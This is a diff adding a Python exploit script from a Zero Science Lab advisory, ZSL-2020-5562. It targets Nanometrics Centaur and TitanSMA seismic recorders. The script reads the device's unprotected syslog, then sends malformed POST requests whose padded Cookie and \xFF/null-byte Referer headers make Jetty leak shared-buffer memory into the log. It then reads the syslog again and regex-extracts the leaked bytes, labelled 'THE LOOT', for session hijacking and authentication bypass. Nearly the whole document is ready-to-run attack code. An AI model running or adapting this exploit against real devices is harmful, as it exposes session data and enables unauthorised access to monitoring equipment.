@@ -1,0 +1,207 @@
+# Exploit Title: Nanometrics Centaur 4.3.23 - Unauthenticated Remote Memory Leak
+# Date: 2020-02-15
+# Author: byteGoblin
+# Vendor: https://www.nanometrics.ca
+# Product: https://www.nanometrics.ca/products/accelerometers/titan-sma
+# Product: https://www.nanometrics.ca/products/digitizers/centaur-digital-recorder
+# CVE: N/A
+#
+# Nanometrics Centaur / TitanSMA Unauthenticated Remote Memory Leak Exploit
+#
+#
+# Vendor: Nanometrics Inc.
+# Product page: https://www.nanometrics.ca/products/accelerometers/titan-sma
+# Product page: https://www.nanometrics.ca/products/digitizers/centaur-digital-recorder
+#
+# Affected versions:
+#   Centaur  <= 4.3.23
+#   TitanSMA <= 4.2.20
+#
+# Summary:
+#   The Centaur Digital Recorder is a portable geophysical sensing acquisition system that consists
+#   of a high-resolution 24-bit ADC, a precision GNSS-based clock, and removable storage capabilities.
+#   Its ease of use simplifies high performance geophysical sensing deplayments in both remote and
+#   networked environments. Optimized for seismicity monitoring, the Centaur is also well-suited for
+#   infrasound and similar geophysical sensor recording applications requiring sample rates up to
+#   5000 sps.
+#
+# Summary:
+#   The TitanSMA is a strong motion accelerograph designed for high precision observational and
+#   structural engineering applications, where scientists and engineers require exceptional dynamic
+#   range over a wide frequency band.
+#
+# Description:
+#   An information disclosure vulnerability exists when Centaur and TitanSMA fail to properly protect
+#   critical system logs such as 'syslog'. Additionally, the implemented Jetty version (9.4.z-SNAPSHOT)
+#   suffers from a memory leak of shared buffers that was (supposedly) patched in Jetty version 9.2.9.v20150224.
+#   As seen in the aforementioned products, the 'patched' version is still vulnerable to the buffer leakage.
+#   Chaining these vulnerabilities allows an unauthenticated adversary to remotely send malicious HTTP
+#   packets, and cause the shared buffer to 'bleed' contents of shared memory and store these in system
+#   logs. Accessing these unprotected logfiles reveal parts of the leaked buffer (up to 17 bytes per sent
+#   packet) which can be combined to leak sensitive data which can be used to perform session hijacking
+#   and authentication bypass scenarios.
+#
+# Tested on:
+#   Jetty 9.4.z-SNAPSHOT
+#
+# Vulnerability discovered by:
+#   byteGoblin @ zeroscience.mk
+#
+#
+# Advisory ID: ZSL-2020-5562
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5562.php
+#
+# Related CVE: CVE-2015-2080
+# Related CWE: CWE-532, CWE-538
+#
+# 10.02.2020
+#
+
+#!/usr/bin/env python3
+
+import requests
+import re
+import sys
+
+class Goblin:
+    def __init__(self):
+        self.host = None
+        self.page = "/zsl"
+        self.syslog = "/logs/syslog"
+        self.buffer_pad = "A" * 70
+        self.buffer = None
+        self.payload = "\xFF"
+        self.payloads_to_send = 70 # 70 seems to be a good number before we get weird results
+        self.body = {}
+        self.headers = None
+        self.syslog_data = {}
+        self.last_line = None
+        self.before_last_line = True
+
+    def banner(self):
+        goblin = """
+                        NN                          
+                      NkllON                        
+                      0;;::k000XN       KxllokN     
+                      0;,:,;;;;:ldK   Kdccc::oK     
+                     Nx,';codddl:::dkdc:c:;lON      
+                   klc:clloooooooc,.':lc;'lX        
+                   x;:ooololccllc:,:ll:,:xX         
+                    Kd:cllc'..';:ccclc,.x            _               .             ___          _       .           
+                  NOoc::c:,'';:ccllc::''k            \ ___  ,    .  _/_     ___  .'   \    __.  \ ___   |   ` , __  
+                Nklc:clccc;.;odoollc:',xN            |/   \ |    `   |    .'   ` |       .'   \ |/   \  |   | |'  `.
+               0l:lollc:;:,.,ccllcc:;..cOKKX         |    ` |    |   |    |----' |    _  |    | |    `  |   | |    |
+              0c;lolc;'...',;;:::::;..:cc:,cK        `___,'  `---|.  \__/ `.___,  `.___|  `._.' `___,' /\__ / /    |
+             Nc'clc;..,,,:::c:;;;,'..:oddoc;c0               \___/                                                  
+             Nl';;,:,.;:,;:;;;,'.....cccc:;..x              InTrOdUcEs: //Nano-Bleed//
+              XxclkXk;'::,,,''';:::;'''...'',:o0    
+                     Kl,''',:cccccc:;..';;;:cc;;dX          Discovered / Created by:    byteGoblin
+                     O,.,;;,;:::::;;,,;::,.';:c';K          contact:                    bytegoblin <at> zeroscience.mk
+             Kdcccccdl'';;..'::;;,,,;:::;,'..;:.;K              
+            d;,;;'...',,,:,..,;,',,;;,,,'.cd,':.;K          Vendor:                     Nanometrics Inc. - nanometrics.ca
+            Oddl',,'',:cxX0:....'',,''..;dKKl,;,,xN         Product:                    Centaur, TitanSMA
+               d...'ckN Xkl:,',:clll:,..,cxd;,::,,xN        Affected versions:          <= 4.3.23, <= 4.3.20
+              0:',';k Xx:,''..,cccc::c:'.';:;..,;,lK
+             0:'clc':o;',;,,.';loddolc;'.,cc'.;olkN         CVE:                        N/A
+            0:'cdxdc,..';..,lOo,:clc:'.,:ccc;.oN            Advisory:                   ZSL-2020-5562 / zeroscience.mk/en/vulnerabilities/ZSL-2020-5562.php
+            :,;okxdc,..,,..lK Xkol;:x0kl;;::;':0    
+            x:,:odo:,'.',,.'xN   0lk   Nk;';:;.cN           Description:                Unauthenticated Remote Memory Leak in Nanometrics Centaur product
+             Xx:,'':xk:..,''lK    Y      k;';;';xX          
+               XOkkko'.....'O             d.';;,,:xN
+                   0dooooooxX             x'.'''',oK                _.o-'( Shout-out to the bois: LiquidWorm, 0nyxd, MemeQueen, Vaakos, Haunt3r )'-o._
+                                          XOkkkkkON 
+        """
+        print(goblin)
+
+    def generate_payload(self, amount_of_bytes):
+        self.payload += "\x00" * amount_of_bytes
+        self.headers = {"Cookie": self.buffer_pad, "Referer": self.payload}
+
+    def read_syslog(self, initial=False):
+        # Read syslog remotely and filter out 'HeapByteBuffer' messages.
+        # 'initial' is used to make a 'snapshot' of the state before we send payloads...
+        # That way we can filter on what we've just sent.
+        print("[!] - Grabbing syslog from: {}{}".format(self.host, self.syslog))
+        buffer = ""
+        r = requests.get(self.host + self.syslog)
+        if r.status_code == 200:
+            print("[!] - We got syslog, it is: {} bytes".format(len(r.content)))
+            split = r.text.split("\n")
+            for line in split:
+                if "HeapByteBuffer" in line:
+                    if initial:
+                        self.last_line = line
+                    else:
+                        if line == self.last_line:
+                            self.before_last_line = False
+                    if not self.before_last_line:
+                        buffer_addr = re.search("\@\w+", line).group(0).strip("@")
+                        try:
+                            leak = re.search(">>>.+(?=\.\.\.)", line).group(0).strip(">>>")
+                            buffer += leak
+                        except Exception as e:
+                            print(e)
+            if initial:
+                return self.last_line
+            self.buffer = buffer
+        else: # we can't access syslog?
+            print("[!!!] - Yoooo... we can't access syslog? Make sure you can access it, dawg...")
+            print("[!!!] - The status code we got was: {}".format(r.status_code))
+            exit(-1)
+
+    def show_output(self):
+        # we need to translate '\r\n' into actual newlines
+        if self.buffer is not None and self.buffer is not "":
+            self.buffer = self.buffer.replace("\\n", "\n")
+            self.buffer = self.buffer.replace("\\r", "\r")
+            self.buffer = self.buffer.replace("%2f", "/")
+
+        print("[*] BUFFER LENGTH: {}".format(len(self.buffer)))
+        print("=" * 50)
+        print("[*] THIS IS THE LOOT")
+        print("=" * 50)
+        for num, x in enumerate(self.buffer.split("\n")):
+            print("{}.\t| \t{}".format(num, x))
+
+    def send_payload(self, amount):
+        print("[!] - Sending payloads to target: {}{}".format(self.host, self.page))
+        if amount > self.payloads_to_send or amount < 0:
+            amount = self.payloads_to_send
+        for num, x in enumerate(range(0, amount)):
+            if num % 10 == 0:
+                print("[!] - [{}/{}] payloads sent...".format(num, amount))
+            try:
+                self.generate_payload(17)
+                r = requests.post(self.host + self.page, data=self.body, headers=self.headers)
+            except Exception as e:
+                print(e)
+        print("[!] - [{}/{}] payloads sent...".format(amount, amount))
+
+    def parse_sys_args(self):
+        if len(sys.argv) >= 2:
+            self.host = sys.argv[1]
+            if not "http" in self.host:
+                self.host = "http://{}".format(self.host)
+            if len(sys.argv) == 3:
+                # amount of packets to send
+                self.payloads_to_send = sys.argv[2]
+        else:
+            self.print_help()
+
+    def print_help(self):
+        print("Usage: {} <ip_addr[:port]> [amount of payloads to send]".format(sys.argv[0]))
+        print("Example: centaur3.py 123.456.789.0:8080 200")
+        print("\tThis will send 200 payloads to the aforementioned host")
+        print("\tThe [port] and [amount of payloads] are optional")
+        exit(-1)
+
+    def main(self):
+        self.parse_sys_args()
+        self.banner()
+        ll = self.read_syslog(initial=True)
+        self.send_payload(70)
+        self.read_syslog()
+        self.show_output()
+
+if __name__ == '__main__':
+    Goblin().main()
